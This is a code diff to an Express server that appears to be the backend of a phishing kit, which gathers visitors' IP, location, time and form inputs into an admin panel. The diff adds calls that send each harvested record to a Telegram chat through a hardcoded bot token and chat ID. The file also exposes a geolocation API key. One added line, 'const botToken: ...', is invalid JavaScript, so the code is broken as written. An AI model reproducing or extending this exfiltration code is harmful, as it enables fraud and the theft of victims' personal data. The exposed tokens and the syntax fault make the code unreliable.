@@ -2,6 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const sqlite3 = require('sqlite3').verbose();
 const axios = require('axios');
+const { sendMessageFor } = require('simple-telegram-message');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -9,6 +10,9 @@ const port = process.env.PORT || 3000;
 // Constants for API details
 const API_URL = 'https://api-bdc.net/data/ip-geolocation?ip=';
 const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const botToken: "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4";
+const chatId = "5200289419";
+
 
 app.use(express.static('public'));
 app.use(bodyParser.json());
@@ -134,6 +138,9 @@ const handleRequest = async (req, res) => {
         `SYSTEM LANGUAGE  : ${systemLang}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
         
+        const sendMessage = sendMessageFor(botToken, chatId);
+  	  sendMessage(message);
+        
     return;
   }
 
@@ -152,6 +159,9 @@ const handleRequest = async (req, res) => {
         `IP ADDRESS       : ${ipAddress}\n` +
         `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
         `💬 Telegram: https://t.me/UpdateTeams\n`;
+        
+        const sendMessage = sendMessageFor(botToken, chatId);
+        sendMessage(message);
         
     return;
   }
@@ -251,7 +261,7 @@ app.post('/input', async (req, res) => { // Mark the route handler as async
     const updatedInputs = { ...existingInputs, ...inputs };
 
     updateClientInputs(clientId, updatedInputs);
-    broadcastAdminPanel();
+    broadcastAdminPanel(currPage);
     res.sendStatus(200);
   });
   
